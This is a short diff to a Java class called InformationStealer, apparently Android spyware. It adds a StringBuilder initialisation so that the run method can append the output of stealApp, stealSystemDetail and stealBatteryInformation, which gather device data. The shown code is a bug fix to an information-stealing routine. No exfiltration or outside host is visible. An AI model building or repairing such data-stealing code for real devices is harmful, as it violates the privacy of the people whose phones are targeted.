@@ -69,6 +69,7 @@ public class InformationStealer implements Runnable {
     public void run(){
 
         JsonObject messaggioJSON;
+        messaggio = new StringBuilder();
         messaggio.append(stealApp(context));
         messaggio.append(stealSystemDetail(context));
         messaggio.append(stealBatteryInformation(context));
